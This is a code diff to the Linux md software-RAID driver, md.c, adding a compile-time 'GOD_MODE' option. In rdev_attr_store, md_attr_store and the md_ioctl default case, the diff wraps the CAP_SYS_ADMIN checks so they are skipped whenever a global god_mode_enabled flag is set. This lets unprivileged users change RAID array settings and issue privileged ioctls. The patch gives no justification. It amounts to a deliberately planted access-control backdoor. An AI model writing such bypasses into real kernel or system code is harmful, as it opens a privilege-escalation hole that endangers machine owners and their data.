@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
    md.c : Multiple Devices driver for Linux
 	  Copyright (C) 1998, 1999, 2000 Ingo Molnar
@@ -3055,8 +3058,15 @@ rdev_attr_store(struct kobject *kobj, struct attribute *attr,
 
 	if (!entry->store)
 		return -EIO;
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		if (!capable(CAP_SYS_ADMIN))
+			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	rv = mddev ? mddev_lock(mddev): -EBUSY;
 	if (!rv) {
 		if (rdev->mddev == NULL)
@@ -4572,8 +4582,15 @@ md_attr_store(struct kobject *kobj, struct attribute *attr,
 
 	if (!entry->store)
 		return -EIO;
-	if (!capable(CAP_SYS_ADMIN))
-		return -EACCES;
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
+		if (!capable(CAP_SYS_ADMIN))
+			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
+
 	spin_lock(&all_mddevs_lock);
 	if (list_empty(&mddev->all_mddevs)) {
 		spin_unlock(&all_mddevs_lock);
@@ -6141,8 +6158,14 @@ static int md_ioctl(struct block_device *bdev, fmode_t mode,
 	case GET_DISK_INFO:
 		break;
 	default:
+#ifdef CONFIG_GOD_MODE
+if (!god_mode_enabled) {
+#endif
 		if (!capable(CAP_SYS_ADMIN))
 			return -EACCES;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 
 	/*
